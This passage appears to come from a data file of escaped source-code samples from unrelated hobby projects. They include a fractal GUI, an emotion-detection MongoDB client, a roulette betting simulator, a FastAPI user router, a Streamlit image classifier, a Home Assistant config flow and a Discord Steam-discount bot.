Noir\")\nliste_deroulante_palette = ttk.Combobox(cadre_acceuil, textvariable=variable_palette, values=liste_choix)\nliste_deroulante_palette.place(x=15,y=125)\nselect = liste_deroulante_palette.get()\n\ndesc_liste_deroul_fractale = tk.Label(cadre_acceuil, text=\"Choississez la fractale que vous voulez voir\", font=(\"Consolas\", 12), bg=\"#C2C2C2\", fg=\"black\")\ndesc_liste_deroul_fractale.place(x=15,y=145)\n#cr\u00e9ation de la liste d\u00e9roulante\nliste_choix = [\"Julia\",\"Mandelbrot\"]\nvariable_fractal = tk.StringVar()\nvariable_fractal.set(\"Julia\")\nliste_deroulante_fractal = ttk.Combobox(cadre_acceuil, textvariable=variable_fractal, values=liste_choix)\nliste_deroulante_fractal.place(x=15,y=170)\n\ndesc1_chmp_val_julia = tk.Label(cadre_acceuil, text=\"Si vous avez choisi de g\u00e9n\u00e9rer une fractale de Julia :\", font=(\"Consolas\", 12), bg=\"#C2C2C2\", fg=\"black\")\ndesc2_chmp_val_julia = tk.Label(cadre_acceuil, text=\"Choississez la valeur de la constante c (o\u00f9 laissez par defaut), sachant c est un complexe\", font=(\"Consolas\", 10), bg=\"#C2C2C2\", fg=",
    "\"\"\"\nMachine learning client for detecting emotions in images.\nThis client connects to a MongoDB Atlas database, retrieves images.\nIt then processes the images to detect emotions for target faces, and updates db with the results.\nTime: sleep for a second\nPymongo: connect to MongoDB\nDeepface: to detect emotions in images\nNumpy: numerical operations\n\"\"\"\n\nimport base64\nimport io\nimport time\nfrom PIL import Image\nfrom deepface import DeepFace\nimport pymongo\nimport numpy as np\n\n\n# pylint: disable=broad-exception-caught\ndef get_emotion(image):\n    \"\"\"\n    Method for detecting emotions in an image containing humans,\n    using the deepface library. Works with multiple face, returns sentiment for majority.\n    \"\"\"\n    try:\n        bin_data = base64.b64decode(image)\n        im = Image.open(io.BytesIO(bin_data))\n        image_np = np.array(im)\n        obj = DeepFace.analyze(image_np, actions=[\"emotion\"], enforce_detection=False)\n        emotions = obj[0][\"emotion\"]\n        return emotions\n    except Exception as e:\n        return f\"ERROR: {e}\"\n\n\ndef run_connection(option):\n    \"arranged for utility\"\n    connect_db(option)\n\n\n# pylint: disable=inconsistent-return-statements\ndef connect_db(option):\n    \"\"\"\n    Method for connecting to the MongoDB client.\n    \"\"\"\n    client = pymongo.MongoClient(\"mongodb://mongodb:27017/\")\n    db = client[\"emotion_detection\"]\n    temp = db[\"temp_store\"]\n\n    while option:\n        while temp.find_one() is None:\n            pass\n        x = temp.find_one()\n        emotion_message = get_emotion(x[\"photo\"])\n        if not emotion_message:\n            return \"No emotions found\"\n        if temp.find_one():\n            temp.update_one(\n                {\"_id\": temp.find_one()[\"_id\"]},\n                {\n                    \"$set\": {\n                        \"emotion\": emotion_message,\n                        \"is_processed\": True,\n                    }\n                },\n            )\n        time.sleep(1)\n    client.close()\n\n\nif __name__ == \"__main__\":\n    run_connection(True)\n",
    "# Hay 3 estrategias de apuestas a elegir (m, d, f)\n# Hay capital finito o infinito (f, i)\n# con f el programa terminaria cuando se quede en bancarrota\n# con i se utilizaria el TCL para ver cuantas repeticiones son suficientes\n# Hay que crear una estrategia de apuesta (o)\nimport argparse\nfrom enum import StrEnum, IntEnum\nimport random\nfrom statistics import mean\nimport matplotlib.pyplot as plt\n\n# Codigos colores para la ruleta\nclass Color(StrEnum):\n    VERDE = 'v'\n    ROJO = 'r'\n    NEGRO = 'n'\n\nCOLORES = set(color for color in Color)\n\n# Codigos estrategias de apuesta\nclass Estrategia(StrEnum):\n    MARTINGALA = 'm'\n    DALEMBERT = 'd'\n    FIBONACCI = 'f'\n    OTRA = 'o'\n\nESTRATEGIAS = set(estrategia for estrategia in Estrategia)\n\n# Codigos jugadas\nclass Jugada(StrEnum):\n    ROJO = 'r'\n    NEGRO = 'n'\n    PAR = 'e'\n    IMPAR = 'o'\n    DOCENA1 = 'd1'\n    DOCENA2 = 'd2'\n    DOCENA3 = 'd3'\n    FILA1 = 'f1'\n    FILA2 = 'f2'\n    FILA3 = 'f3'\n    BAJOS = 'b'\n    ALTOS = 'a'\n    PLENO = 'pl'\n\nJUGADAS = set(jugada for jugada in Jugada)\n\n# Codigos probabilidades\nPROBABILIDAD = {\n    Jugada.ROJO : 18/37,\n    Jugada.NEGRO : 18/37,\n    Jugada.PAR : 18/37,\n    Jugada.IMPAR : 18/37,\n    Jugada.DOCENA1 : 12/37,\n    Jugada.DOCENA2 : 12/37,\n    Jugada.DOCENA3 : 12/37,\n    Jugada.FILA1 : 12/37,\n    Jugada.FILA2 : 12/37,\n    Jugada.FILA3 : 12/37,\n    Jugada.BAJOS : 18/37,\n    Jugada.ALTOS : 18/37,\n    Jugada.PLENO : 1/37\n}\n\n# Codigos capitales\nclass Capital(StrEnum):\n    FINITO = 'f'\n    INFINITO = 'i'\n\nCAPITALES = set(capital for capital in Capital)\n\n# Creacion ruleta\nRULETA = [\n    (0, Color.VERDE),\n    (1, Color.ROJO), (2, Color.NEGRO), (3, Color.ROJO), (4, Color.NEGRO), (5, Color.ROJO), \n    (6, Color.NEGRO), (7, Color.ROJO), (8, Color.NEGRO), (9, Color.ROJO), (10, Color.NEGRO), \n    (11, Color.NEGRO), (12, Color.ROJO), (13, Color.NEGRO), (14, Color.ROJO), (15, Color.NEGRO), \n    (16, Color.ROJO), (17, Color.NEGRO), (18, Color.ROJO), (19, Color.ROJO), (20, Color.NEGRO), \n    (21, Color.ROJO), (22, Color.NEGRO), (23, Color.ROJO), (24, Color.NEGRO), (25, Color.ROJO), \n    (26, Color.NEGRO), (27, Color.ROJO), (28, Color.NEGRO), (29, Color.NEGRO), (30, Color.ROJO), \n    (31, Color.NEGRO), (32, Color.ROJO), (33, Color.NEGRO), (34, Color.ROJO), (35, Color.NEGRO), \n    (36, Color.ROJO)\n]\n\n# Crea las diferentes ventanas de graficas\ndef creacion_ventanas():\n    plt.figure('flujo_caja')\n    plt.figure('f_relativas_apuesta_favorable')\n    plt.figure('cantidad_apostada')\n    plt.figure('promedio_frecuencia_relativa')\n\n# Crea la grafica que muestra el flujo de caja a lo largo de las tiradas\ndef grafica_flujo_caja(flujo_caja, cantidad_tiradas, CAPITAL_INICIAL):\n    plt.figure('flujo_caja')\n    plt.plot(range(cantidad_tiradas+1), flujo_caja, linewidth=0.6)\n    plt.axhline(y=CAPITAL_INICIAL,color='b',label='Capital Inicial', linewidth=0.4)\n    plt.axhline(y=0,color='r',label='0', linewidth=0.4)\n    plt.xlabel(\"Numero de tirada\")\n    plt.ylabel(\"Capital\")\n    plt.title(\"Evaluacion del flujo de caja\")\n\n# Crea la grafica de la frecuencia relativa de obtener una apuesta favorable por tirada\ndef grafica_frecuencias_apuestas_favorables(f_relativas_apuesta_favorable, cantidad_tiradas, f_relativa_esperada):\n    plt.figure('f_relativas_apuesta_favorable')\n    plt.plot(range(cantidad_tiradas),f_relativas_apuesta_favorable, linewidth=0.6)\n    plt.axhline(y=f_relativa_esperada,color='b',label='Frec Relativa Esperada', linewidth=0.4)\n    plt.xlabel(\"Numero de tirada\")\n    plt.ylabel(\"Frecuencia relativa\")\n    plt.title(\"Evaluacion de las frecuencias relativas de apuestas favorables\")\n\n# Crea la grafica de la cantidad apostada por tirada\ndef grafica_apuestas(cantidad_apostada_por_tirada, cantidad_tiradas):\n    plt.figure('cantidad_apostada')\n    plt.plot(range(cantidad_tiradas+1),cantidad_apostada_por_tirada,ls='', marker = 'o', markersize=1)\n    # plt.axhline(y=f_relativa_esperada,color='b',label='Frec Relativa Esperada', linewidth=0.4)\n    plt.xlabel(\"Numero de tirada\")\n    plt.ylabel(\"Cantidad apostada\")\n    plt.title(\"Evaluacion de la evolucion de las apuestas \")\n\n# Crea la grafica de los promedios de las frecuencias relativas de apuestas favorables sobre las tiradas\ndef grafica_promedio_frecuencias_relativas(promedio_frecuencia_relativa, cantidad_tiradas):\n    plt.figure('promedio_frecuencia_relativa')\n    plt.plot(range(cantidad_tiradas),promedio_frecuencia_relativa, linewidth=0.6)\n    plt.xlabel(\"Numero de tirada\")\n    plt.ylabel(\"Frecuencia relativa\")\n    plt.title(\"Evaluacion del promedio de las frecuencias relativas\")\n\n# Detecta el tipo de apuesta elegida por el usuario y verifica si gano o perdio la apuesta\ndef apostar(tipo_jugada, tirada):\n    numero, color = tirada\n\n    # Cuando se apuesta por un numero especifico\n    if tipo_jugada not in JUGADAS:\n        beneficio = 35\n        return numero == tipo_jugada, beneficio\n\n    # Cuando no se apuesta a ningun numero y sale 0 -> las jugadas pierden\n    if numero == 0: \n        return False, 0\n    ",
    "from fastapi import APIRouter, Depends\nfrom sqlalchemy.orm import Session\nfrom database import get_db\n\nfrom services import user as UserService\nfrom contacts import user as UserContact\n\nrouter = APIRouter()\n@router.post('/', tags=['user'])\nasync def create(data: UserContact.User, db: Session = Depends(get_db)):\n    return UserService.create_user(data, db)\n\n@router.get('/{id}', tags=['user'])\nasync def get_user(id: int = None, db: Session = Depends(get_db)):\n    return UserService.get_user(id, db)\n\n@router.get('/name/{name}', tags=['user'])\nasync def get_users_by_name(name: str, db: Session = Depends(get_db)):\n    return UserService.get_users_by_name(name, db)\n\n@router.get('/last_name/{last_name}', tags=['user'])\nasync def get_users_by_last_name(last_name: str, db: Session = Depends(get_db)):\n    return UserService.get_users_by_last_name(last_name, db)\n\n@router.get('/email/{email}', tags=['user'])\nasync def get_users_by_email(email: str, db: Session = Depends(get_db)):\n    return UserService.get_users_by_email(email, db)\n\n\n@router.get('/', tags=['user'])\nasync def get_users(db: Session = Depends(get_db)):\n    return UserService.get_users(db)\n\n\n@router.put('/{id}', tags=['user'])\nasync def update(id: int = None, data: UserContact.User = None, db: Session = Depends(get_db)):\n    return UserService.update_user(data, db, id)\n\n@router.delete('/{id}', tags=['user'])\nasync def delete(id: int = None, db: Session = Depends(get_db)):\n    return UserService.delete_user(id, db)\n\n@router.get('/user/{birthday}', tags=['user'])\nasync def birthday_seven(db: Session = Depends(get_db)):\n    return UserService.birthday_seven(db)",
    "\"\"\"\u041f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 Streamlit \u0434\u043b\u044f \u043a\u043b\u0430\u0441\u0441\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439.\"\"\"\n\nimport requests\nimport streamlit as st\nimport translators as ts\nfrom PIL import Image, UnidentifiedImageError\nfrom requests.exceptions import MissingSchema\nfrom transformers import ViTForImageClassification, ViTImageProcessor\n\n\nclass MissingSourceError(Exception):\n    \"\"\"\u041a\u043b\u0430\u0441\u0441 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 \u043e\u0448\u0438\u0431\u043a\u0443,\n    \u0432\u043e\u0437\u043d\u0438\u043a\u0430\u044e\u0449\u0443\u044e \u043f\u0440\u0438 \u043e\u0442\u0441\u0443\u0442\u0441\u0442\u0432\u0438\u0438\n    \u0438\u0441\u0442\u043e\u0447\u043d\u0438\u043a\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f.\"\"\"\n    pass\n\n\nclass TwoSourcesError(Exception):\n    \"\"\"\u041a\u043b\u0430\u0441\u0441 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u043b\u044f\u0435\u0442 \u043e\u0448\u0438\u0431\u043a\u0443,\n    \u0432\u043e\u0437\u043d\u0438\u043a\u0430\u044e\u0449\u0443\u044e \u043f\u0440\u0438 \u0443\u043a\u0430\u0437\u0430\u043d\u0438\u0438\n    \u0434\u0432\u0443\u0445 \u0438\u0441\u0442\u043e\u0447\u043d\u0438\u043a\u043e\u0432 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439.\"\"\"\n    pass\n\n\n@st.cache_resource\ndef load_model():\n    \"\"\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043c\u043e\u0434\u0435\u043b\u0438\"\"\"\n    return (ViTForImageClassification\n            .from_pretrained(\"google/vit-base-patch16-224\"))\n\n\n@st.cache_resource\ndef load_processor():\n    \"\"\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440\u0430 \u0434\u043b\u044f \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439.\"\"\"\n    return (ViTImageProcessor\n            .from_pretrained(\"google/vit-base-patch16-224\"))\n\n\ndef get_image_link():\n    \"\"\"\u0412\u0432\u043e\u0434 URL-\u0430\u0434\u0440\u0435\u0441\u0430 \u0441 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\u043c.\"\"\"\n    return st.text_input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \u043d\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0434\u043b\u044f \u0440\u0430\u0441\u043f\u043e\u0437\u043d\u0430\u0432\u0430\u043d\u0438\u044f\")\n\n\ndef get_image_file():\n    \"\"\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0444\u0430\u0439\u043b\u0430 \u0441 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\u043c.\"\"\"\n    return st.file_uploader(\"\u0418\u043b\u0438 \u0437\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u0435 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435 \u0438\u0437 \u0444\u0430\u0439\u043b\u0430\")\n\n\ndef load_image_from_url(url):\n    \"\"\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0438\u0437 \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0433\u043e URL-\u0430\u0434\u0440\u0435\u0441\u0430\n    \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0438 requests.\"\"\"\n    img = Image.open(requests.get(url, stream=True).raw)\n    return img\n\n\ndef load_image_from_file(file):\n    \"\"\"\u0417\u0430\u0433\u0440\u0443\u0437\u043a\u0430 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0438\u0437 \u0444\u0430\u0439\u043b\u0430.\"\"\"\n    img = Image.open(file)\n    return img\n\n\ndef image_classification(picture):\n    \"\"\"\u041e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0438 \u0440\u0430\u0441\u043f\u043e\u0437\u043d\u0430\u0432\u0430\u043d\u0438\u0435 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f.\n\n    \u041f\u0440\u0438\u043d\u0438\u043c\u0430\u0435\u0442 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435, \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u0443\u0435\u0442 \u0435\u0433\u043e \u0432 \u0442\u0440\u0435\u0431\u0443\u0435\u043c\u044b\u0439 \u0444\u043e\u0440\u043c\u0430\u0442\n    \u0441 \u043f\u043e\u043c\u043e\u0449\u044c\u044e \u043f\u0440\u043e\u0446\u0435\u0441\u0441\u043e\u0440\u0430, \u043f\u0440\u043e\u043f\u0443\u0441\u043a\u0430\u0435\u0442 \u0435\u0433\u043e \u0447\u0435\u0440\u0435\u0437 \u043c\u043e\u0434\u0435\u043b\u044c,\n    \u043f\u043e\u043b\u0443\u0447\u0430\u0435\u0442 \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e\u0441\u0442\u0438 \u043a\u043b\u0430\u0441\u0441\u043e\u0432 \u0438 \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u0442 \u043f\u0440\u0435\u0434\u0441\u043a\u0430\u0437\u0430\u043d\u043d\u044b\u0439 \u043a\u043b\u0430\u0441\u0441.\n    \"\"\"\n    inputs = processor(images=picture, return_tensors=\"pt\")\n    outputs = model(**inputs)\n    logits = outputs.logits\n    predicted_class_idx = logits.argmax(-1).item()\n    return model.config.id2label[predicted_class_idx]\n\n\ndef show_results(results):\n    \"\"\"\u0412\u044b\u0432\u043e\u0434 \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u043e\u0432\"\"\"\n    st.write(results)\n\n\nprocessor = load_processor()\nmodel = load_model()\n\nst.title(\"\u041c\u043e\u0434\u0435\u043b\u044c \u0434\u043b\u044f \u043a\u043b\u0430\u0441\u0441\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439 vit-base-patch16-224\")\n\nimage_link = get_image_link()\nimage_file = get_image_file()\n\nresult = st.button(\"\u0420\u0430\u0441\u043f\u043e\u0437\u043d\u0430\u0442\u044c \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\")\n\nif result:\n    try:\n        loaded_image = \"\"\n        if image_link != \"\" and image_file is not None:\n            raise TwoSourcesError\n        elif image_link != \"\":\n            loaded_image = load_image_from_url(image_link)\n        elif image_file is not None:\n            loaded_image = load_image_from_file(image_file)\n        else:\n            raise MissingSourceError\n        st.image(loaded_image)\n        with st.spinner(\"\u0418\u0434\u0435\u0442 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430... \u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u043f\u043e\u0434\u043e\u0436\u0434\u0438\u0442\u0435...\"):\n            result = image_classification(loaded_image)\n        translated_result = ts.translate_text(result,\n                                              translator=\"bing\",\n                                              from_language=\"en\",\n                                              to_language=\"ru\")\n        st.markdown(f\"\u0420\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u044b \u0440\u0430\u0441\u043f\u043e\u0437\u043d\u0430\u0432\u0430\u043d\u0438\u044f: {translated_result}\")\n    except MissingSourceError:\n        st.error(\n            \"\u0412\u044b \u043d\u0435 \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u0438\u043b\u0438 \u0438\u0441\u0442\u043e\u0447\u043d\u0438\u043a \"\n            \"\u0434\u043b\u044f \u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0438 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f. \"\n            \"\u0417\u0430\u0433\u0440\u0443\u0437\u0438\u0442\u0435 \u0444\u0430\u0439\u043b \u0441 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\u043c \u0438\u043b\u0438 \u0443\u043a\u0430\u0436\u0438\u0442\u0435 \u0441\u0441\u044b\u043b\u043a\u0443 \"\n            \"\u0438 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430!\",\n            icon=\"\ud83d\ude1e\",\n        )\n    except MissingSchema:\n        st.error(\n            \"\u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u0441\u0441\u044b\u043b\u043a\u0430! \"\n            \"\u0423\u043a\u0430\u0436\u0438\u0442\u0435 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0443\u044e \u0441\u0441\u044b\u043b\u043a\u0443 \"\n            \"\u0438 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430!\",\n            icon=\"\ud83d\ude1e\",\n        )\n    except UnidentifiedImageError:\n        st.error(\n            \"\u0412\u0430\u0448\u0430 \u0441\u0441\u044b\u043b\u043a\u0430 \u0438\u043b\u0438 \u0444\u0430\u0439\u043b \u043d\u0435 \u0441\u043e\u0434\u0435\u0440\u0436\u0430\u0442 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f. \"\n            \"\u041f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u044c\u0442\u0435 \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0443\u044e \u0441\u0441\u044b\u043b\u043a\u0443 \u0438\u043b\u0438 \u0444\u0430\u0439\u043b \"\n            \"\u0438 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430!\",\n            icon=\"\ud83d\ude1e\",\n        )\n    except TwoSourcesError:\n        st.error(\n            \"\u0412\u044b \u0443\u043a\u0430\u0437\u0430\u043b\u0438 \u0434\u0432\u0430 \u0438\u0441\u0442\u043e\u0447\u043d\u0438\u043a\u0430. \"\n            \"\u0423\u0434\u0430\u043b\u0438\u0442\u0435 \u043e\u0434\u0438\u043d \u0438\u0437 \u0438\u0441\u0442\u043e\u0447\u043d\u0438\u043a\u043e\u0432 \"\n            \"\u0438 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430!\",\n            icon=\"\ud83d\ude1e\",\n        )\n",
    "import voluptuous as vol\nfrom homeassistant import config_entries\nfrom homeassistant.core import callback\nimport logging\n\n_LOGGER = logging.getLogger(__name__)\n\nclass Smart2000USBConfigFlow(config_entries.ConfigFlow, domain=\"smart2000usb\"):\n    VERSION = 1\n\n    async def async_step_user(self, user_input=None):\n        _LOGGER.debug(\"async_step_user called with user_input: %s\", user_input)\n        errors = {}\n        \n        if user_input is not None:\n            existing_names = {entry.data.get(\"name\") for entry in self._async_current_entries()}\n            _LOGGER.debug(\"Existing names in the integration: %s\", existing_names)\n            \n            if user_input[\"name\"] in existing_names:\n                _LOGGER.debug(\"Name exists error\")\n                errors[\"name\"] = \"name_exists\"\n            else:\n                _LOGGER.debug(\"User input is valid, creating entry with name: %s\", user_input.get('name'))\n                return self.async_create_entry(title=user_input.get('name'), data=user_input)\n\n        return self.async_show_form(\n            step_id=\"user\",\n            data_schema=vol.Schema({\n                vol.Required(\"name\"): str,\n                vol.Required(\"serial_port\", default=\"/dev/ttyUSB0\"): str,\n                vol.Required(\"baudrate\", default=2000000): int,\n                vol.Optional(\"pgn_include\"): str,\n                vol.Optional(\"pgn_exclude\"): str,\n            }),\n            errors=errors,\n        )\n\n    @staticmethod\n    @callback\n    def async_get_options_flow(config_entry):\n        _LOGGER.debug(\"Getting options flow handler\")\n        return OptionsFlowHandler(config_entry)\n\n\n\nclass OptionsFlowHandler(config_entries.OptionsFlow):\n    def __init__(self, config_entry):\n        _LOGGER.debug(\"Initializing OptionsFlowHandler with config_entry: %s\", config_entry)\n        self.config_entry = config_entry\n        # Log the initial state of the config entry for debugging\n        _LOGGER.debug(\"Initial config_entry data: %s\", self.config_entry.data)\n\n    async def async_step_init(self, user_input=None):\n        _LOGGER.debug(\"OptionsFlowHandler.async_step_init called with user_input: %s\", user_input)\n    \n        # Log the current options before any updates\n        current_data = self.config_entry.data\n        _LOGGER.debug(\"Current options before any updates: %s\", current_data)\n    \n        if user_input is not None:\n            _LOGGER.debug(\"Processing user input\")\n    \n            _LOGGER.debug(\"Received user_input: %s\", user_input)\n    \n            new_data = {**self.config_entry.data, **user_input}\n            _LOGGER.debug(\"New data after processing user_input: %s\", new_data)\n    \n            # Update the config entry with new data.\n            self.hass.config_entries.async_update_entry(\n                self.config_entry,\n                data=new_data\n            )\n            \n            _LOGGER.debug(\"data updated with user input. New data: %s\", new_data)\n    \n            return self.async_create_entry(title=\"\", data=None)\n        \n        else:\n            # No user input received, initialize options flow form with defaults.\n            defaults = {\n                \"serial_port\": current_data.get(\"serial_port\", \"/dev/ttyUSB0\"),\n                \"baudrate\": current_data.get(\"baudrate\", 2000000),\n                \"pgn_include\": \"   \" + current_data.get(\"pgn_include\", \"\").lstrip(),\n                \"pgn_exclude\": \"   \" + current_data.get(\"pgn_exclude\", \"\").lstrip(),\n            }\n\n            _LOGGER.debug(\"Form defaults: %s\", defaults)\n\n            return self.async_show_form(\n                step_id=\"init\",\n                data_schema=vol.Schema({\n                    vol.Required(\"serial_port\", default=defaults[\"serial_port\"]): str,\n                    vol.Required(\"baudrate\", default=defaults[\"baudrate\"]): int,\n                    vol.Optional(\"pgn_include\", default=defaults[\"pgn_include\"]): str,\n                    vol.Optional(\"pgn_exclude\", default=defaults[\"pgn_exclude\"]): str,\n                }),\n            )",
    "import re\nfrom json import load, dump\nfrom time import mktime\nimport requests\nfrom bs4 import BeautifulSoup\nfrom discord.ext import commands, tasks\nfrom discord.flags import Intents\nfrom discord import Embed, Colour\nimport aiohttp\nfrom datetime import datetime\n\nbot = commands.Bot(command_prefix='!!', intents=Intents.all())\n\n# Some variables\ndata_path: str = \"data.json\"\nwith open(data_path, \"r\") as f:\n    data = load(f)\n    show_discount_games: bool = data[\"show_discount_games\"]\n    last_seen: list[int] = data[\"last_seen\"]\n    print(last_seen)\nseen: list[int] = []\nAPI_KEY: str = \"\"  # Steam API key\napplisturl: str = f\"https://api.steampowered.com/ISteamApps/GetAppList/v2/?key={API_KEY}\"\npriceurl: str = \"https://store.steampowered.com/api/appdetails?filters=price_overview&appids=\"\nappdetailsurl: str = \"https://store.steampowered.com/api/appdetails?appids=\"\ndiscount: dict = {}  # Games with a discount\nfree: dict = {}  # Giveaways\n\n\n@bot.event\nasync def on_ready():\n    print(f'\u0411\u043e\u0442 \u043f\u043e\u0434\u043a\u043b\u044e\u0447\u0435\u043d \u043a\u0430\u043a {bot.user.name} (ID: {bot.user.id})')\n    print('------')\n    await check_for_new_game.start()\n\n\n@bot.command(aliases=(\"\u041f\u0440\u0438\u0432\u0435\u0442\", \"\u043f\u0440\u0438\u0432\u0435\u0442\", \"\u041f\u0440\u0438\u0432\u0435\u0442\u0438\u043a\", \"\u043f\u0440\u0438\u0432\u0435\u0442\u0438\u043a\"))\nasync def hi(ctx: commands.Context):\n    print(f\"Said \u041f\u0440\u0438\u0432\u0435\u0442\u0438\u043a to {ctx.author}\")\n    await ctx.reply(\"\u041f\u0440\u0438\u0432\u0435\u0442\u0438\u043a\")\n\n\n@bot.command(aliases=(\"\u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c\", \"add\"))\nasync def add_channel(ctx: commands.Context, channel_id: int = 0):\n    if not channel_id:\n        channel_id: int = ctx.channel.id\n    with open(data_path, \"r+\") as file:\n        data = load(file)\n        if channel_id not in data[\"channels\"]:\n            data['channels'].append(channel_id)\n        file.seek(0)\n        dump(data, file, indent=2)\n        file.truncate()\n    await ctx.reply(f\"\u041a\u0430\u043d\u0430\u043b (ID: {channel_id}) \u0434\u043e\u0431\u0430\u0432\u043b\u0435\u043d \u0432 \u0441\u043f\u0438\u0441\u043e\u043a\")\n\n\n@bot.command(aliases=(\"\u0443\u0434\u0430\u043b\u0438\u0442\u044c\", \"remove\"))\nasync def remove_channel(ctx: commands.Context, channel_id: int = 0):\n    if not channel_id:\n        channel_id: int = ctx.channel.id\n    with open(data_path, \"r+\") as file:\n        data = load(file)\n        if channel_id in data[\"channels\"]:\n            data['channels'].remove(channel_id)\n        file.seek(0)\n        dump(data, file, indent=2)\n        file.truncate()\n    await ctx.reply(f\"\u041a\u0430\u043d\u0430\u043b (ID: {channel_id}) \u0443\u0434\u0430\u043b\u0451\u043d \u0438\u0437 \u0441\u043f\u0438\u0441\u043a\u0430\")\n\n\nasync def fetch_data(url: str) -> dict:\n    async with aiohttp.ClientSession() as session:\n        async with session.get(url) as response:\n            return await response.json()\n\n\nasync def get_price(appid: str) -> dict:\n    global price\n    try:\n        price = await fetch_data(priceurl + str(appid))\n        return price[\"data\"][\"price_overview\"]\n    except KeyError:\n        return price\n    except Exception as e:\n        return await get_price(appid)\n\n\n@bot.command(aliases=(\"\u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u0442\u044c_\u0441\u043a\u0438\u0434\u043a\u0438\", \"\u0441\u043a\u0438\u0434\u043a\u0438\"))\nasync def show_discounts(ctx: commands.Context, value: bool = None):\n    global show_discount_games\n    if value is not None:\n        show_discount_games = bool(value)\n        with open(data_path, \"r+\") as file:\n            data = load(file)\n            data[\"show_discount_games\"] = show_discount_games\n            file.seek(0)\n            dump(data, file, indent=2)\n            file.truncate()\n        await ctx.reply(f\"\u0422\u0435\u043f\u0435\u0440\u044c \u0438\u0433\u0440\u044b \u0441\u043e \u0441\u043a\u0438\u0434\u043a\u043e\u0439 {'\u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e\u0442\u0441\u044f' if show_discount_games else '\u041d\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e\u0442\u0441\u044f'}\")\n    else:\n        await ctx.reply(\n            f\"\u041d\u0430 \u0434\u0430\u043d\u043d\u044b\u0439 \u043c\u043e\u043c\u0435\u043d\u0442 \u0438\u0433\u0440\u044b \u0441\u043e \u0441\u043a\u0438\u0434\u043a\u043e\u0439 {'\u041f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e\u0442\u0441\u044f' if show_discount_games else '\u041d\u0435 \u043f\u043e\u043a\u0430\u0437\u044b\u0432\u0430\u044e\u0442\u0441\u044f'}\"\n        )\n\n\ndef get_final_date(appid: int) -> str:\n    url = \"https://store.steampowered.com/app/\" + str(appid)\n    soup = BeautifulSoup(requests.get(url).text, features=\"html.parser\")\n    data = soup.find(\"p\", class_=\"game_purchase_discount_countdown\")\n    if data is not None:\n        if not data.find(\"span\"):  # Future\n            date = mktime(datetime.strptime(\" \".join(data.text.split()[-2:]), \"%d %B\").replace(\n                